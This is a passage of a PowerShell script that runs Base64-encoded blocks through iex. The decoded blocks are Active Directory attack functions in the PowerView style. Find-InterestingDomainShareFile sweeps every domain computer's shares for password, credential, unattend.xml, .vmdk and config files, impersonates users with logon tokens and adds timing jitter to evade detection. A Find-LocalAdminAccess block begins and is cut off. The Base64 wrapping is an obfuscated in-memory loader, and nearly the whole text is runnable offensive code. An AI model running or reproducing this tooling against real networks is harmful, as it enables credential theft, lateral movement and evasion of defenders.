G9nb25Ub2tlbikgewogICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmIC1Ub2tlbkhhbmRsZSAkTG9nb25Ub2tlbgogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRmluZC1JbnRlcmVzdGluZ0RvbWFpblNoYXJlRmlsZSB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Gb3VuZEZpbGUnKV0KICAgIFtDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ0ZpbGVTcGVjaWZpY2F0aW9uJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0ROU0hvc3ROYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlckRvbWFpbiwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyTERBUEZpbHRlciwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyU2VhcmNoQmFzZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnT3BlcmF0aW5nU3lzdGVtJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1NlcnZpY2VQYWNrJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJTZXJ2aWNlUGFjaywKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnU2l0ZU5hbWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNpdGVOYW1lLAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdGaWxlU3BlY2lmaWNhdGlvbicpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdTZWFyY2hUZXJtcycsICdUZXJtcycpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSW5jbHVkZSA9IEAoJypwYXNzd29yZConLCAnKnNlbnNpdGl2ZSonLCAnKmFkbWluKicsICcqbG9naW4qJywgJypzZWNyZXQqJywgJ3VuYXR0ZW5kKi54bWwnLCAnKi52bWRrJywgJypjcmVkcyonLCAnKmNyZWRlbnRpYWwqJywgJyouY29uZmlnJyksCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbVmFsaWRhdGVQYXR0ZXJuKCdcXFxcJyldCiAgICAgICAgW0FsaWFzKCdTaGFyZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkU2hhcmVQYXRoLAogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkRXhjbHVkZWRTaGFyZXMgPSBAKCdDJCcsICdBZG1pbiQnLCAnUHJpbnQkJywgJ0lQQyQnKSwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnRmlsZVNwZWNpZmljYXRpb24nKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtEYXRlVGltZV0KICAgICAgICAkTGFzdEFjY2Vzc1RpbWUsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0ZpbGVTcGVjaWZpY2F0aW9uJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbRGF0ZVRpbWVdCiAgICAgICAgJExhc3RXcml0ZVRpbWUsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0ZpbGVTcGVjaWZpY2F0aW9uJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbRGF0ZVRpbWVdCiAgICAgICAgJENyZWF0aW9uVGltZSwKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnT2ZmaWNlRG9jcycpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJE9mZmljZURvY3MsCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0ZyZXNoRVhFcycpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZyZXNoRVhFcywKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJERlbGF5ID0gMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgwLjAsIDEuMCldCiAgICAgICAgW0RvdWJsZV0KICAgICAgICAkSml0dGVyID0gLjMsCiAgICAgICAgW0ludF0KICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDApXQogICAgICAgICRUaHJlYWRzID0gMjAKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdQcm9wZXJ0aWVzJyA9ICdkbnNob3N0bmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJEb21haW4nXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkQ29tcHV0ZXJEb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyTERBUEZpbHRlciddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkQ29tcHV0ZXJMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNlYXJjaEJhc2UnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJENvbXB1dGVyU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0nXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snT3BlcmF0aW5nU3lzdGVtJ10gPSAkT3BlcmF0aW5nU3lzdGVtIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNlcnZpY2VQYWNrJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZpY2VQYWNrJ10gPSAkU2VydmljZVBhY2sgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyU2l0ZU5hbWUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2l0ZU5hbWUnXSA9ICRTaXRlTmFtZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJOYW1lJ10pIHsKICAgICAgICAgICAgJFRhcmdldENvbXB1dGVycyA9ICRDb21wdXRlck5hbWUKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tGaW5kLUludGVyZXN0aW5nRG9tYWluU2hhcmVGaWxlXSBRdWVyeWluZyBjb21wdXRlcnMgaW4gdGhlIGRvbWFpbicKICAgICAgICAgICAgJFRhcmdldENvbXB1dGVycyA9IEdldC1Eb21haW5Db21wdXRlciBAQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50cyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IGRuc2hvc3RuYW1lCiAgICAgICAgfQogICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLUludGVyZXN0aW5nRG9tYWluU2hhcmVGaWxlXSBUYXJnZXRDb21wdXRlcnMgbGVuZ3RoOiAkKCRUYXJnZXRDb21wdXRlcnMuTGVuZ3RoKSIKICAgICAgICBpZiAoJFRhcmdldENvbXB1dGVycy5MZW5ndGggLWVxIDApIHsKICAgICAgICAgICAgdGhyb3cgJ1tGaW5kLUludGVyZXN0aW5nRG9tYWluU2hhcmVGaWxlXSBObyBob3N0cyBmb3VuZCB0byBlbnVtZXJhdGUnCiAgICAgICAgfQogICAgICAgICRIb3N0RW51bUJsb2NrID0gewogICAgICAgICAgICBQYXJhbSgkQ29tcHV0ZXJOYW1lLCAkSW5jbHVkZSwgJEV4Y2x1ZGVkU2hhcmVzLCAkT2ZmaWNlRG9jcywgJEV4Y2x1ZGVIaWRkZW4sICRGcmVzaEVYRXMsICRDaGVja1dyaXRlQWNjZXNzLCAkVG9rZW5IYW5kbGUpCiAgICAgICAgICAgIGlmICgkVG9rZW5IYW5kbGUpIHsKICAgICAgICAgICAgICAgICROdWxsID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1Ub2tlbkhhbmRsZSAkVG9rZW5IYW5kbGUgLVF1aWV0CiAgICAgICAgICAgIH0KICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgICAgICRTZWFyY2hTaGFyZXMgPSBAKCkKICAgICAgICAgICAgICAgIGlmICgkVGFyZ2V0Q29tcHV0ZXIuU3RhcnRzV2l0aCgnXFwnKSkgewogICAgICAgICAgICAgICAgICAgICRTZWFyY2hTaGFyZXMgKz0gJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkVXAgPSBUZXN0LUNvbm5lY3Rpb24gLUNvdW50IDEgLVF1aWV0IC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgaWYgKCRVcCkgewogICAgICAgICAgICAgICAgICAgICAgICAkU2hhcmVzID0gR2V0LU5ldFNoYXJlIC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRTaGFyZSBpbiAkU2hhcmVzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU2hhcmVOYW1lID0gJFNoYXJlLk5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRQYXRoID0gJ1xcJyskVGFyZ2V0Q29tcHV0ZXIrJ1wnKyRTaGFyZU5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoJFNoYXJlTmFtZSkgLWFuZCAoJFNoYXJlTmFtZS5UcmltKCkgLW5lICcnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkRXhjbHVkZWRTaGFyZXMgLU5vdENvbnRhaW5zICRTaGFyZU5hbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROdWxsID0gW0lPLkRpcmVjdG9yeV06OkdldEZpbGVzKCRQYXRoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaFNoYXJlcyArPSAkUGF0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlshXSBObyBhY2Nlc3MgdG8gJFBhdGgiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBGb3JFYWNoICgkU2hhcmUgaW4gJFNlYXJjaFNoYXJlcykgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlNlYXJjaGluZyBzaGFyZTogJFNoYXJlIgogICAgICAgICAgICAgICAgICAgICRTZWFyY2hBcmdzID0gQHsKICAgICAgICAgICAgICAgICAgICAgICAgJ1BhdGgnID0gJFNoYXJlCiAgICAgICAgICAgICAgICAgICAgICAgICdJbmNsdWRlJyA9ICRJbmNsdWRlCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkT2ZmaWNlRG9jcykgewogICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoQXJnc1snT2ZmaWNlRG9jcyddID0gJE9mZmljZURvY3MKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRGcmVzaEVYRXMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaEFyZ3NbJ0ZyZXNoRVhFcyddID0gJEZyZXNoRVhFcwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJExhc3RBY2Nlc3NUaW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hBcmdzWydMYXN0QWNjZXNzVGltZSddID0gJExhc3RBY2Nlc3NUaW1lCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkTGFzdFdyaXRlVGltZSkgewogICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoQXJnc1snTGFzdFdyaXRlVGltZSddID0gJExhc3RXcml0ZVRpbWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCRDcmVhdGlvblRpbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaEFyZ3NbJ0NyZWF0aW9uVGltZSddID0gJENyZWF0aW9uVGltZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJENoZWNrV3JpdGVBY2Nlc3MpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaEFyZ3NbJ0NoZWNrV3JpdGVBY2Nlc3MnXSA9ICRDaGVja1dyaXRlQWNjZXNzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIEZpbmQtSW50ZXJlc3RpbmdGaWxlIEBTZWFyY2hBcmdzCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRUb2tlbkhhbmRsZSkgewogICAgICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICRMb2dvblRva2VuID0gJE51bGwKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVsYXknXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydTdG9wT25TdWNjZXNzJ10pIHsKICAgICAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbCAtUXVpZXQKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RlbGF5J10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snU3RvcE9uU3VjY2VzcyddKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLUludGVyZXN0aW5nRG9tYWluU2hhcmVGaWxlXSBUb3RhbCBudW1iZXIgb2YgaG9zdHM6ICQoJFRhcmdldENvbXB1dGVycy5jb3VudCkiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLUludGVyZXN0aW5nRG9tYWluU2hhcmVGaWxlXSBEZWxheTogJERlbGF5LCBKaXR0ZXI6ICRKaXR0ZXIiCiAgICAgICAgICAgICRDb3VudGVyID0gMAogICAgICAgICAgICAkUmFuZE5vID0gTmV3LU9iamVjdCBTeXN0ZW0uUmFuZG9tCiAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRDb21wdXRlciBpbiAkVGFyZ2V0Q29tcHV0ZXJzKSB7CiAgICAgICAgICAgICAgICAkQ291bnRlciA9ICRDb3VudGVyICsgMQogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJFJhbmROby5OZXh0KCgxLSRKaXR0ZXIpKiREZWxheSwgKDErJEppdHRlcikqJERlbGF5KQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtSW50ZXJlc3RpbmdEb21haW5TaGFyZUZpbGVdIEVudW1lcmF0aW5nIHNlcnZlciAkVGFyZ2V0Q29tcHV0ZXIgKCRDb3VudGVyIG9mICQoJFRhcmdldENvbXB1dGVycy5jb3VudCkpIgogICAgICAgICAgICAgICAgSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrICRIb3N0RW51bUJsb2NrIC1Bcmd1bWVudExpc3QgJFRhcmdldENvbXB1dGVyLCAkSW5jbHVkZSwgJEV4Y2x1ZGVkU2hhcmVzLCAkT2ZmaWNlRG9jcywgJEV4Y2x1ZGVIaWRkZW4sICRGcmVzaEVYRXMsICRDaGVja1dyaXRlQWNjZXNzLCAkTG9nb25Ub2tlbgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1JbnRlcmVzdGluZ0RvbWFpblNoYXJlRmlsZV0gVXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkczogJFRocmVhZHMiCiAgICAgICAgICAgICRTY3JpcHRQYXJhbXMgPSBAewogICAgICAgICAgICAgICAgJ0luY2x1ZGUnID0gJEluY2x1ZGUKICAgICAgICAgICAgICAgICdFeGNsdWRlZFNoYXJlcycgPSAkRXhjbHVkZWRTaGFyZXMKICAgICAgICAgICAgICAgICdPZmZpY2VEb2NzJyA9ICRPZmZpY2VEb2NzCiAgICAgICAgICAgICAgICAnRXhjbHVkZUhpZGRlbicgPSAkRXhjbHVkZUhpZGRlbgogICAgICAgICAgICAgICAgJ0ZyZXNoRVhFcycgPSAkRnJlc2hFWEVzCiAgICAgICAgICAgICAgICAnQ2hlY2tXcml0ZUFjY2VzcycgPSAkQ2hlY2tXcml0ZUFjY2VzcwogICAgICAgICAgICAgICAgJ1Rva2VuSGFuZGxlJyA9ICRMb2dvblRva2VuCiAgICAgICAgICAgIH0KICAgICAgICAgICAgTmV3LVRocmVhZGVkRnVuY3Rpb24gLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXJzIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtU2NyaXB0UGFyYW1ldGVycyAkU2NyaXB0UGFyYW1zIC1UaHJlYWRzICRUaHJlYWRzCiAgICAgICAgfQogICAgfQogICAgRU5EIHsKICAgICAgICBpZiAoJExvZ29uVG9rZW4pIHsKICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZiAtVG9rZW5IYW5kbGUgJExvZ29uVG9rZW4KICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRmluZC1Mb2NhbEFkbWluQWNjZXNzIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZShbU3RyaW5nXSldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0ROU0hvc3ROYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlckRvbWFpbiwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyTERBUEZpbHRlciwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyU2VhcmNoQmFzZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnT3BlcmF0aW5nU3lzdGVtJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1NlcnZpY2VQYWNrJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJTZXJ2aWNlUGFjaywKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnU2l0ZU5hbWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNpdGVOYW1lLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJENoZWNrU2hhcmVBY2Nlc3MsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICREZWxheSA9IDAsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMC4wLCAxLjApXQogICAgICAgIFtEb3VibGVdCiAgICAgICAgJEppdHRlciA9IC4zLAogICAgICAgIFtJbnRdCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwKV0KICAgICAgICAkVGhyZWFkcyA9IDIwCiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnUHJvcGVydGllcycgPSAnZG5zaG9zdG5hbWUnCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyRG9tYWluJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJENvbXB1dGVyRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlckxEQVBGaWx0ZXInXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJENvbXB1dGVyTERBUEZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJTZWFyY2hCYXNlJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRDb21wdXRlclNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VuY29uc3RyYWluZWQnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snVW5jb25zdHJhaW5lZCddID0gJFVuY29uc3RyYWluZWQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyT3BlcmF0aW5nU3lzdGVtJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ09wZXJhdGluZ1N5c3RlbSddID0gJE9wZXJhdGluZ1N5c3RlbSB9CiA